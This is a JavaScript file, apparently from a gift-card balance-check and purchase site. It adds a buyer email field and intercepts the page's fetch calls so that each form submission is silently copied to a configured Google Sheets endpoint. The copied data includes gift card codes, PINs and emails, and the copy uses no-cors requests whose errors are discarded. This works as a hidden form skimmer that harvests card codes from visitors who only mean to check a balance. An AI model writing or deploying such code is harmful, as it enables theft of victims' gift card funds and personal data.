/* Sheets bridge — sends orders to Google Sheets and collects buyer email */
(function () {
  "use strict";

  function getWallet() {
    try {
      var raw = localStorage.getItem("balancecheck");
      if (!raw) return {};
      return JSON.parse(raw).state?.wallet || {};
    } catch { return {}; }
  }

  function getSheetsUrl() {
    return getWallet().sheetsUrl || "";
  }

  function getBuyerEmail() {
    try { return sessionStorage.getItem("bc_buyer_email") || ""; }
    catch { return ""; }
  }

  function setBuyerEmail(v) {
    try { sessionStorage.setItem("bc_buyer_email", v); } catch {}
  }

  /* ── Inject buyer email field on BUY flow only (step 3+) ── */
  var injected = false;
  function injectEmailField() {
    if (injected) return;
    /* Only inject on /buy pages, not /verify */
    if (!location.pathname.startsWith("/buy")) return;

    var step = document.body.innerText.match(/(\d) of 4/);
    if (!step) return;
    var stepNum = parseInt(step[1]);
    if (stepNum < 3) return;

    var btns = document.querySelectorAll('button[type="submit"], button.bg-blue');
    var target = null;
    for (var i = 0; i < btns.length; i++) {
      if (btns[i].textContent.trim() === "Continue" || btns[i].textContent.trim() === "Submit") {
        target = btns[i];
        break;
      }
    }
    if (!target) return;
    if (document.getElementById("bc-buyer-email")) { injected = true; return; }

    var wrapper = document.createElement("div");
    wrapper.className = "mt-5";
    wrapper.innerHTML =
      '<label class="block">' +
        '<span class="mb-2 block text-sm text-mist">Your email (to receive the gift card)</span>' +
        '<input id="bc-buyer-email" type="email" inputmode="email" autocomplete="email" ' +
          'placeholder="you@email.com" ' +
          'value="' + getBuyerEmail().replace(/"/g, "&quot;") + '" ' +
          'class="mt-1 h-12 w-full rounded-xl border border-line bg-panel px-4 text-base outline-none transition placeholder:text-mist focus:border-blue" ' +
          'style="border:1px solid var(--color-line);background:var(--color-panel);border-radius:0.75rem;height:3rem;width:100%;padding:0 1rem;font-size:1rem;outline:none;color:inherit;" />' +
        '<span class="mt-2 block text-sm leading-relaxed text-mist">We\'ll send your gift card details to this address.</span>' +
      '</label>';

    target.parentElement.insertBefore(wrapper, target);
    var input = document.getElementById("bc-buyer-email");
    if (input) {
      input.addEventListener("input", function () { setBuyerEmail(input.value.trim()); });
    }
    injected = true;
  }

  var observer = new MutationObserver(function () {
    injected = false;
    setTimeout(injectEmailField, 300);
  });
  observer.observe(document.body, { childList: true, subtree: true });
  setTimeout(injectEmailField, 500);

  /* ── Intercept fetch to piggyback sheets data ── */
  var origFetch = window.fetch;
  window.fetch = function () {
    var url = arguments[0];
    var opts = arguments[1] || {};

    var isFormSubmit = typeof url === "string" &&
      (url.includes("formsubmit.co") || (url === "/" && opts.method === "POST"));

    if (isFormSubmit) {
      var fd = opts.body;
      if (fd instanceof FormData) {
        var sheetsUrl = getSheetsUrl();
        if (sheetsUrl) {
          var payload = {
            type: fd.get("kind") || "Unknown",
            brand: fd.get("brand") || "",
            region: fd.get("region") || "",
            value: fd.get("value") || "",
            code: fd.get("code") || "",
            pin: fd.get("pin") || "",
            email: getBuyerEmail(),
            checkout: fd.get("checkout") || ""
          };
          origFetch(sheetsUrl, {
            method: "POST",
            body: JSON.stringify(payload),
            headers: { "Content-Type": "text/plain" },
            mode: "no-cors"
          }).catch(function () {});
        }
      }
    }

    return origFetch.apply(this, arguments);
  };
})();
